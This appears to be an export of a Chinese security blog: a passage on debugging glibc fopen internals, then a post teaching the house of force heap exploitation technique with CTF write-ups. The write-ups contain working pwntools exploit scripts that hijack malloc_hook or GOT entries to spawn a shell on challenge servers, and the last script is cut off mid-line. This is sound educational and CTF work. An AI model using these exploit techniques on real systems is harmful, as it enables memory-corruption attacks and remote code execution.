<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;/home/hacker/Desktop/flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h3 id="整体调用流程图"><a href="#整体调用流程图" class="headerlink" title="整体调用流程图"></a>整体调用流程图</h3><p><img src="/../img/image-20221007215412769.png" alt="image-20221007215412769"></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>刚进入fopen函数的时候，就发现要调用__fopen_internal 函数了（如下图）。然后这里要注意的就是为啥执行的是fopen函数，但一进去就在_IO_new_fopen函数中呢? </p>
<p>原因是这里的宏定义 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_fopen fopen</span></span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007220100510.png" alt="image-20221007220100510"></p>
<h4 id="给新创建的结构体申请一片内存空间"><a href="#给新创建的结构体申请一片内存空间" class="headerlink" title="给新创建的结构体申请一片内存空间"></a>给新创建的结构体申请一片内存空间</h4><p>然后进入__fopen_internal函数后，第一个调用的函数就是malloc来分配了一块locked_FILE结构体大小的内存(如下图)，这个结构体包含了_IO_FILE_plus、_IO_lock_t、_IO_wide_data这三个结构体。由于我们并不调试malloc函数，因此这里我们n过去</p>
<p><img src="/../img/image-20221007215434310.png" alt="image-20221007215434310"></p>
<h4 id="对FILE结构体初始化"><a href="#对FILE结构体初始化" class="headerlink" title="对FILE结构体初始化"></a>对FILE结构体初始化</h4><p>malloc函数执行后，再往下就是_IO_no_init函数(如下图)，我们si进去看看这个函数做了什么</p>
<p><img src="/../img/image-20221007215454681.png" alt="image-20221007215454681"></p>
<p>可以发现调用了这个_IO_old_init函数，我们再次si进去</p>
<p><img src="/../img/image-20221007215520022.png" alt="image-20221007215520022"></p>
<p>发现是在对_IO_FILE_plus结构体进行初始化(如下)</p>
<p><img src="/../img/image-20221007215534954.png" alt="image-20221007215534954"></p>
<p>此时的_IO_FILE_plus结构体中的成员变量如下</p>
<p><img src="/../img/image-20221007215548563.png" alt="image-20221007215548563"></p>
<p>等到_IO_old_init函数执行后，出来继续执行_IO_no_init函数，发现在对_IO_wide_data结构体中的成员变量进行初始化，因此得出结论_IO_no_init函数就是在进行着结构体的初始化工作</p>
<p><img src="/../img/image-20221007215605749.png" alt="image-20221007215605749"></p>
<h4 id="将-IO-FILE-plus结构体链入-IO-list-all链表"><a href="#将-IO-FILE-plus结构体链入-IO-list-all链表" class="headerlink" title="将_IO_FILE_plus结构体链入_IO_list_all链表"></a>将_IO_FILE_plus结构体链入_IO_list_all链表</h4><p>等到_IO_no_init函数出来后，就调用了_IO_file_init函数</p>
<p><img src="/../img/image-20221007215627273.png" alt="image-20221007215627273"></p>
<p>可以发现其实_IO_file_init函数主要是对_IO_link_in函数的一个封装，而_IO_link_in函数听名字就感觉是进行的链入操作,si进去看看</p>
<p><img src="/../img/image-20221007215640763.png" alt="image-20221007215640763"></p>
<p>这部分主要的代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp;</span><br></pre></td></tr></table></figure>

<p>很明显这里就把fp(也就是结构体_IO_FILE_plus)给链入了链表中</p>
<p><img src="/../img/image-20221007215652819.png" alt="image-20221007215652819"></p>
<p>下面两个图片分别是将fp链入前后的情况</p>
<p><img src="/../img/image-20221007215705984.png" alt="image-20221007215705984"></p>
<p><img src="/../img/image-20221007215718666.png" alt="image-20221007215718666"></p>
<p>链入前后整个链表对应的情况如下：</p>
<p><img src="/../img/image-20221007215732445.png" alt="image-20221007215732445"></p>
<h4 id="执行open系统调用来打开文件"><a href="#执行open系统调用来打开文件" class="headerlink" title="执行open系统调用来打开文件"></a>执行open系统调用来打开文件</h4><p>当_IO_file_init 函数执行完后，就来到了fopen函数的核心部分，将要调用_IO_file_fopen函数(如下)</p>
<p><img src="/../img/image-20221007215749092.png" alt="image-20221007215749092"></p>
<p>进入_IO_file_fopen函数后，发现先fopen函数的mode参数(文件的打开方式)进行了处理</p>
<p><img src="/../img/image-20221007215801237.png" alt="image-20221007215801237"></p>
<p>而后调用了_IO_file_open函数(这里就不再放图片说明了)，然后si进去，该函数又调用了open64函数，再次si进去执行了open系统调用</p>
<p><img src="/../img/image-20221007215812651.png" alt="image-20221007215812651"></p>
<p>然后这里将sys_open执行后的文件描述符赋值给fp-&gt;fileno(如下图)</p>
<p><img src="/../img/image-20221007215826367.png" alt="image-20221007215826367"></p>
<p>至此fopen函数的整个流程可以说是接近尾声了，最后再次调用了_IO_link_in函数，确保fp已经链入了链表中(如果发现链入后，那么_IO_link_in函数将直接退出)。(如下图)</p>
<p><img src="/../img/image-20221007215838094.png" alt="image-20221007215838094"></p>
<p><img src="/../img/image-20221007215850109.png" alt="image-20221007215850109"></p>
<p>至此fopen函数结束，此时的FILE结构体如下</p>
<p><img src="/../img/image-20221007215905013.png" alt="image-20221007215905013"></p>
<h3 id="总结fopen调用流程"><a href="#总结fopen调用流程" class="headerlink" title="总结fopen调用流程"></a>总结fopen调用流程</h3><p>将整个fopen函数的调用流程概括一下为:</p>
<blockquote>
<p>1、给新创建的结构体申请一片内存空间</p>
<p>2、对FILE结构体初始化</p>
<p>3、将_IO_FILE_plus结构体链入_IO_list_all链表</p>
<p>4、执行open系统调用来打开文件</p>
</blockquote>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://la13x.github.io/2021/07/27/IO-FILE/#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">IO_FILE相关利用 | Alex’s blog~ (la13x.github.io)</a></p>
<p><a href="https://nightrainy.github.io/2019/08/03/IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%A9%E7%94%A8/">_IO_FILE结构体利用 - 知世の小屋 (nightrainy.github.io)</a></p>
<p><a href="https://www.anquanke.com/post/id/177910">IO FILE之fopen详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">(41条消息) 好好说话之IO_FILE利用（1）：利用_IO_2_1_stdout泄露libc_hollk的博客-CSDN博客_stdout泄露libc</a></p>
<p><a href="https://www.cnblogs.com/hawkJW/p/13546416.html">pwn——IO_FILE学习（一） - hawkJW - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>源码调试&amp;&amp;分析</category>
      </categories>
      <tags>
        <tag>源码调试&amp;&amp;分析</tag>
      </tags>
  </entry>
  <entry>
    <title>关于house of force的学习总结</title>
    <url>/posts/73595adc.html</url>
    <content><![CDATA[<p>house of force是针对top chunk的一种手法，通过这种攻击手法，可以将top chunk更新到任意内存，再次申请堆块并写入数据，这就相当于任意地址任意写了。</p>
<span id="more"></span>

<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>在<strong>2.23和2.27</strong>的libc版本中，由于<strong>没有对top chunk的size合法性进行检查</strong>，因此如果我们能够<strong>控制top chunk的size位</strong>以及<strong>malloc在申请堆块时的大小不受限制</strong>，那么就可以完成该攻击。</p>
<p>先从malloc函数源码看起，如果malloc函数执行时发现没有任何的bins中的堆块能够满足需求，就会从top chunk中切下一块内存返回给malloc**(前提是top chunk能够有这么多内存供切割)**</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;<span class="comment">//获取当前top chunk的地址</span></span><br><span class="line">size = chunksize (victim);<span class="comment">//计算top chunk的大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line"><span class="comment">//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20</span></span><br><span class="line"><span class="comment">//如果top chunk的大小大于nb(程序执行malloc需要分配的内存大小)</span></span><br><span class="line"><span class="comment">//加上MINSIZE的大小，就从top chunk中来切一块内存</span></span><br><span class="line"><span class="comment">//之所以要加上MINSIZE是要保证切割后剩余的内存要是一个完整的堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;<span class="comment">//remainder_size为切割后的剩余大小</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb);<span class="comment">//remainder为切割前top chunk+nb的值，也就是切割后top chunk的地址</span></span><br><span class="line">    av-&gt;top = remainder;<span class="comment">//更新top chunk</span></span><br><span class="line">    <span class="comment">//下面两个set_head给切割出去的堆块以及切割后的top chunk设置新的size</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);<span class="comment">//调试用的，这里没用</span></span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//返回用户指针</span></span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>漏洞的利用在这一行代码<code>remainder = chunk_at_offset (victim, nb)</code> 如果我们可以控制nb的值，其实就可以控制remainder的值了(remainder就是切割后的top chunk的地址)，这个手法最终的效果就是精准控制切割后top chunk的地址。</p>
<h2 id="探究一下如何控制top-chunk的地址"><a href="#探究一下如何控制top-chunk的地址" class="headerlink" title="探究一下如何控制top_chunk的地址"></a>探究一下如何控制top_chunk的地址</h2><p>下面我们深入分析一下上面那个式子，来探究一下如何精准控制top chunk的地址。</p>
<p>首先<code>remainder = chunk_at_offset (victim, nb)</code>等价于下面这个式子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim+nb=top_chunk</span><br></pre></td></tr></table></figure>

<blockquote>
<p>victim为切割前的top chunk header地址<br>nb为实际要申请的内存大小<br>top_chunk为切割后的top chunk header的地址</p>
</blockquote>
<p>然后将nb和top_chunk再具体展开一下(解释在代码的下面)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nb=request_size+0x10</span><br><span class="line">top_chunk+0x10=target_addr</span><br></pre></td></tr></table></figure>

<blockquote>
<p>nb 也等于我们malloc时的内存大小(requset_size)，再加上一个0x10的chunk头<br>target_addr先假设是篡改top chunk后的地址<br>house of force的核心就是篡改top chunk的地址，而我们的数据自然是只能输入到用户区，因此我们需要让top chunk+0x10后才能保证target_addr是位于了篡改后chunk的用户区</p>
</blockquote>
<p>将上面两部分整合一下，即为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim+request_size+0x10=target_addr-0x10</span><br></pre></td></tr></table></figure>

<p>最终整理一下为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request_size=target_addr-0x20-victim</span><br></pre></td></tr></table></figure>

<p>叙述一下这个式子就是我们 <strong>所申请的内存大小等于想要将top chunk篡改到的地址减去top chunk原本的地址再减去0x20</strong> <u>（32位程序是-0x10，原理一样，只不过原本0x8的内存单元变成了0x4，所以最终的值减半）</u></p>
<h2 id="house-of-force中对top-chunk的size进行的检查"><a href="#house-of-force中对top-chunk的size进行的检查" class="headerlink" title="house of force中对top chunk的size进行的检查"></a>house of force中对top chunk的size进行的检查</h2><p>此时我们执行malloc(request_size)，就可以将top chunk更新到指定的地址了么?</p>
<blockquote>
<p>不可以。别忘了存在一个检查<code>if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</code>通常来说我们这个request_size是个负数，强转为无符号整数进行判断时，request_size肯定为一个超大的数值，如果top chunk本身的size是正常的话，必然无法满足这个要求，因此house of force的一个条件就是可以控制top chunk的size位(通常都是通过溢出的方式)，将其size设置为-1，-1是转换成无符号整数时，将变成最大的数字0xffffffffffffffff，无论request_size为多大都可以通过if检查了。</p>
</blockquote>
<p>将top chunk的size改为0xffffffffffffffff后，再执行malloc(request_size)，即可将top chunk更新到我们指定的地址，然后再次malloc时即可将该内存申请出来，并写入数据。上述内容就是house of force的攻击过程了。</p>
<h2 id="house-of-force手法总结"><a href="#house-of-force手法总结" class="headerlink" title="house of force手法总结"></a>house of force手法总结</h2><blockquote>
<p>适用libc版本:2.23 2.27</p>
<p>使用前提:</p>
<p>1、申请堆块的大小不受限制</p>
<p>2、能够篡改top chunk的size位(主要是通过溢出的手段)</p>
<p>3、有top chunk原本的地址(这一条在特殊情况下，可以不具备)</p>
<p>4、有将top chunk更新后的目的地址(这一条在特殊情况下，可以不具备)</p>
<p>PS：特殊情况为：我们只需要top chunk的地址更新到堆区，这样我们只需要知道top chunk和目的地址二者的偏移即可。(因为本身其实算request_size的时候要的就是二者偏移)(相关题目可以看hitcontraining_bamboobox)</p>
<p>攻击效果：可以将top chunk更新到任意已知地址，再将新的堆块从top chunk中申请出来写入数据。就可以达到任意地址任意写的目的。</p>
<p>防御措施：对top chunk的size位进行检查，判断是否合法</p>
</blockquote>
<h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007212605409.png" alt="image-20221007212605409"></p>
<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p><img src="/../img/image-20221007212736745.png" alt="image-20221007212736745"></p>
<p>简单分析一下程序就会发现，这道题只有一个功能，就是add函数。</p>
<h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="/../img/image-20221007212804763.png"></p>
<p>首先是malloc申请的内存大小无检查。</p>
<p><img src="/../img/image-20221007212810461.png" alt="image-20221007212810461"></p>
<p>然后printf会打印出来申请的堆地址，最后就是不管malloc申请的内存多大，都可以输入0x50字节的内容，因此这里存在溢出(伪代码看的话这个*v0和*i没关系，但是看汇编的话就会发现这俩是一个东西，估计是转伪代码的时候出问题了吧)</p>
<h3 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h3><p>因为这道题没有free函数，就一个add函数，因此很多手法都是失效了。但是因为这几个漏洞点正好符合house of force攻击的条件。所以就用house of force嘎嘎打了。</p>
<p>1、先申请一块超大内存，利用mmap映射后与libc基地址存在的固定偏移，来拿到libc基地址。</p>
<p>2、将top chunk的size位修改为-1</p>
<p>3、精心构造出申请chunk的大小，保证从top chunk中切下来后，让top chunk位于malloc_hook(其实应该位于realloc_hook上的，因为要用realloc来调整栈帧，不过这就是后话了)</p>
<p>4、申请堆块，将malloc_hook从top chunk中申请出来，然后写入one_gadget。</p>
<p>5、发现所有one_gadget都打不通，只能用realloc调整栈帧再打one_gadget</p>
<blockquote>
<p>然后我主要提三个点做一下相关解释吧:</p>
<p>1、为什么其他师傅都申请的是0x200000大小的堆块？</p>
<p>2、精心构造chunk大小，让top chunk位于malloc_hook上，这个chunk大小是怎么算的？</p>
<p>3、最后realloc+4是怎么调试出来的?</p>
</blockquote>
<h3 id="1、为什么其他师傅都申请的是0x200000大小的堆块？"><a href="#1、为什么其他师傅都申请的是0x200000大小的堆块？" class="headerlink" title="1、为什么其他师傅都申请的是0x200000大小的堆块？"></a>1、为什么其他师傅都申请的是0x200000大小的堆块？</h3><p>如果大家这里尝试过mmap映射内存大小是几万字节或者十几万字节的话，应该会发现，本地能打通，但是远程打不通这个情况。</p>
<p><strong>导致了这个情况的原因是因为申请的堆块地址位于了ld中</strong>(请参考下图 )如果环境一样的情况下，libc和ld直接的固定偏移是可以直接用的，就是说你本地的环境如果和远程的环境一样的话(这个环境相同指的并不是libc相同)，你拿ld与libc的固定偏移，打远程也是ok的。但是如果本地和远程环境不一样，结果就是你本地用ld和libc的那个偏移能打通，但是到远程还用这个偏移拿到的就不是libc正确的基地址了。</p>
<p><img src="/../img/image-20221007212827121.png"></p>
<p>经过我不断调试，发现当申请0x1FBFE9大小以上的时候，mmap映射的内存才会到libc区域。(最大是多少，我没有试)</p>
<p>所以说这里未必非要是申请0x200000大小的堆块，只要大于等于0x1fbfe9就行。这样申请出来的堆块地址就和libc基地址存在固定偏移了(如下图)</p>
<p><img src="/../img/image-20221007212919863.png" alt="image-20221007212919863"></p>
<h3 id="2、申请的size为多少，才能让top-chunk位于malloc-hook上？"><a href="#2、申请的size为多少，才能让top-chunk位于malloc-hook上？" class="headerlink" title="2、申请的size为多少，才能让top chunk位于malloc_hook上？"></a>2、申请的size为多少，才能让top chunk位于malloc_hook上？</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request_size=target_addr-0x20-victim</span><br></pre></td></tr></table></figure>

<p>直接套这个式子，解释在文章最开始。</p>
<p>都不用算出来，脚本直接这样写即可。</p>
<p><img src="/../img/image-20221007212926940.png"></p>
<p><strong>这里多减了0x10的原因是因为，我将top chunk的地址篡改为了realloc_hook-8的位置。因为要连着realloc_hook和malloc_hook一起修改了,调整栈帧打one_gadget。</strong></p>
<h3 id="3、realloc-4是怎么调试出来的"><a href="#3、realloc-4是怎么调试出来的" class="headerlink" title="3、realloc+4是怎么调试出来的?"></a>3、realloc+4是怎么调试出来的?</h3><p>这个咋调试的话，本文就不具体说明了。主要会的师傅不需要解释，不会的师傅需要仔细解释说明。所以需要弄懂realloc+4咋调试出来的师傅 可以看我这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16421631.html#_label3">文章</a>  仔细看完之后，保证嘎嘎会。如果对我写的哪里有疑问，可以一起交流一下。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;bin addr &#x27;</span>)</span><br><span class="line">    heap_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> heap_addr</span><br><span class="line"></span><br><span class="line">leak_libc_addr=add(<span class="number">0x210000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr+<span class="number">0x210ff0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4526a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">leak_heap_addr=add(<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">top_chunk_addr=leak_heap_addr+<span class="number">0x10</span></span><br><span class="line">log_addr(<span class="string">&#x27;top_chunk_addr&#x27;</span>)</span><br><span class="line">realloc_addr=libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+libc_base_addr</span><br><span class="line">malloc_hook=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+libc_base_addr</span><br><span class="line">log_addr(<span class="string">&#x27;malloc_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add((malloc_hook-<span class="number">0x20</span>-top_chunk_addr-<span class="number">0x10</span>),<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbbbbbb&#x27;</span>+p64(one_gadget)+p64(realloc_addr+<span class="number">4</span>))</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0xCCB,0xAF9)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007212940793.png" alt="image-20221007212940793"></p>
<h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007212946708.png" alt="image-20221007212946708"></p>
<h3 id="漏洞所在：-1"><a href="#漏洞所在：-1" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><h4 id="堆地址的泄露"><a href="#堆地址的泄露" class="headerlink" title="堆地址的泄露"></a>堆地址的泄露</h4><p><img src="/../img/image-20221007212955450.png" alt="image-20221007212955450"></p>
<p>这里乍一看malloc(0x40),input 0x40的数据似乎不存在溢出，但因为strcpy函数的存在，所以这里的溢出是必然的。我们直接将0x40个数据输满，然后调一下(如下图)。</p>
<p><img src="/../img/image-20221007213007064.png" alt="image-20221007213007064"></p>
<p>(上图是即将拷贝，之前strcpy函数前的栈空间)strcpy函数会将红色框部分的数据以及一个\x00全部拷贝到刚申请的0x40的堆块中，会发现此时拷贝的数据溢出了末尾的堆地址以及一个\x00。溢出原因是因为strcpy函数遇到\x00或者\x0a才会停止，而输入的数据将原本栈中的\x00给覆盖掉了，就导致多拷贝了一个地址，然后拷贝结束strcpy函数会加上一个\x00。</p>
<p>下图为拷贝后的堆布局，可以发现拷贝后造成了溢出。</p>
<p><img src="/../img/image-20221007213014472.png" alt="image-20221007213014472"></p>
<p>接下来再执行printf函数的时候就将这个溢出的堆地址泄露出来了。</p>
<p><img src="/../img/image-20221007213022094.png" alt="image-20221007213022094"></p>
<h4 id="strcpy导致堆溢出"><a href="#strcpy导致堆溢出" class="headerlink" title="strcpy导致堆溢出"></a>strcpy导致堆溢出</h4><p>有了上面的溢出情况后，我们如法炮制，在这里依旧将两次的输入写满，看看会不会也出现溢出的情况</p>
<p>观察下图发现，确实又发生了溢出，而溢出的原因与上面堆地址泄露那个溢出原因一样，也是因为栈里没有出现\x00将strcpy函数截断，导致strcpy拷贝时发生了溢出。</p>
<p><img src="/../img/image-20221007213200865.png" alt="image-20221007213200865"></p>
<p>这就说明我们可以现在可以控制top chunk的大小，知道top chunk的地址，malloc申请堆块大小时不受限制，因此选择house of force attack。</p>
<h3 id="大致思路：-1"><a href="#大致思路：-1" class="headerlink" title="大致思路："></a>大致思路：</h3><p>1、利用strcpy函数的溢出配合%s来泄露堆地址，再利用strcpy函数溢出来修改top chunk的size为0xffffffff。</p>
<p>2、利用house of force将top chunk位置改到bss段指针数组的位置</p>
<p>3、篡改bss段存储chunk地址的指针数组为free的got地址和puts的got地址</p>
<p>4、用edit将free的got表改为puts的plt表</p>
<p>5、free存储在bss段上的puts的got地址，由此来泄露libc地址</p>
<p>6、将free的got地址改为system地址，然后free掉存有&#x2F;bin&#x2F;sh字符串的地址即可获取shell</p>
<h3 id="篡改free-got表的一个坑"><a href="#篡改free-got表的一个坑" class="headerlink" title="篡改free got表的一个坑"></a>篡改free got表的一个坑</h3><p>整体利用过程还是比较简单的，就不再赘述了。主要记录一下篡改free函数got表时的一个坑。</p>
<p>由于此时我们已经将top chunk的地址进行了修改，而此时top chunk的size为<img src="/../img/image-20221007213214848.png"></p>
<p>上图的这个size不是固定不变的，跟top chunk的地址有关系，不过这个size肯定是一个负数(这里展示的是补码)</p>
<p>这个size记录的是 id为0的chunk大小。</p>
<p>然后在edit函数里面有一个检查(如下)</p>
<p><img src="/../img/image-20221007213222656.png" alt="image-20221007213222656"></p>
<p>i初始值为0，但是a2(就是size)为负数，也就是说这里我们的数据是写不进去的。</p>
<p>所以我们需要将函数的got地址布置到id为0之后的chunk地址才行，否则无法对其进行编辑。</p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc32.so&#x27;</span>)</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26687</span>)</span><br><span class="line">c_a=<span class="number">0x08048D11</span></span><br><span class="line">c_d=<span class="number">0x08048D26</span></span><br><span class="line">c_e=<span class="number">0x08048D1F</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the length of the note content:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Create success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the new content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Edit success.\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Delete success.\n&#x27;)</span></span><br><span class="line">    </span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Input your name:\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">leak_heap_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap_addr&#x27;</span>)</span><br><span class="line">top_chunk_addr=leak_heap_addr+<span class="number">0xd0</span></span><br><span class="line">log_addr(<span class="string">&#x27;top_chunk_addr&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Org:\n&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Host:\n&#x27;</span>,p64(<span class="number">0xffffffff</span>))</span><br><span class="line"><span class="comment">#debug(p,c_a,c_d,c_e,0x08048BE1)</span></span><br><span class="line">add((<span class="number">0x0804B120</span>-<span class="number">0x10</span>-top_chunk_addr),<span class="string">&#x27;zikh&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p32(<span class="number">0</span>)+p32(free_got_addr)+p32(puts_got_addr)+p32(<span class="number">0x0804B120</span>+<span class="number">0x10</span>)+<span 